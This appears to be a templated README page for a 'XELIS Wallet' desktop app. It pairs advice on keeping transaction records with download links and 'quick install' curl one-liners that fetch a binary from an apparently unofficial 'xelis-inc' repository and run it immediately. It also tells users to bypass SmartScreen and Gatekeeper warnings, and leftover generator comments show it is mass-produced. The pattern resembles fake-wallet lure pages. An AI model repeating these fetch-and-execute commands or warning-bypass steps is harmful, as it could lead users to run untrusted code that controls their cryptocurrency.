![XELIS Wallet transaction history and records you can keep](assets/banner-article.png)
# XELIS Wallet transaction history and records you can keep

Read the record, capture what matters and reconcile a disputed entry.

## Downloads - Records

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> A screenshot is evidence only if it shows the identifier, the amount and the state at the same moment.

XELIS Wallet lists incoming and outgoing transactions with their amounts and state. Read the identifier and confirmation state for anything you may need to prove later, and capture the details while they are visible. For a disputed entry, compare the wallet against an explorer for that address.

<!-- ARTICLE-BODY-BEGIN -->
## What the history list holds

Every transaction the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> knows about appears in history, with the direction, the amount and a state that moves from pending to confirmed. It is the same data the balance is computed from, filtered to a list you can read.

It is not an accounting system. There are no categories, no exchange rates and no statements, which is why the practical advice is to capture what you need rather than assume it will be easy to reconstruct.

## Reading a single record

Four fields carry the meaning: direction, amount, counterparty address and confirmation state. The identifier is what lets anyone else check the transaction, so it is the field to note first when a payment matters.

A pending record that later disappears is worth investigating rather than ignoring. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md">XELIS Wallet pending transaction</a> explains the difference between an entry that is queued and one that never left the app.

## Keeping records without an export button

If your build offers an export, use it and keep the file. If it does not, capture the screen with the identifier visible and write the context down: what the payment was for, the date and who the counterparty was. That note is what turns a transaction identifier into something you can explain a year later.

Do not treat a screenshot of an amount alone as a record. It proves nothing without the identifier and the state at that moment.

## When a record is missing

A missing entry is usually a sync problem rather than a deleted transaction. Compare the wallet's view with an explorer for the same address before concluding anything, then check the node as described in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-balance-missing-restore.md">fix a missing XELIS Wallet balance</a>.

If the explorer shows the transaction and the wallet does not, the wallet has not read that part of the chain yet. Wait, resync, or switch node.

## Matching records to addresses

History identifies a counterparty by address, not by name, so a usable record pairs the address with the person or service it belongs to. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-address-format-integrated.md">XELIS Wallet address formats</a> explains what that string does and does not tell you, which matters when you go back to check who was paid.

## FAQ
### How do I see my XELIS Wallet transaction history?
Open the wallet's history list; every transaction the wallet knows about is listed with its state.

### Can I export history as a file?
Only if your build offers an export. These docs cannot confirm one, so capture the identifier and details manually otherwise.

### Why is a transaction missing from history?
Usually the wallet has not synced that part of the chain. Check an explorer for the address before assuming it vanished.

### Does history show the fee?
The fee is part of the transaction, so it appears with the record. It is charged on top of the amount, not deducted from it.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Send XEL from XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-send-fee-confirmation.md)
- [Missing XELIS Wallet balance](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-balance-missing-restore.md)
- [XELIS Wallet address formats](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-address-format-integrated.md)
- [XELIS Wallet pending transaction](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md)
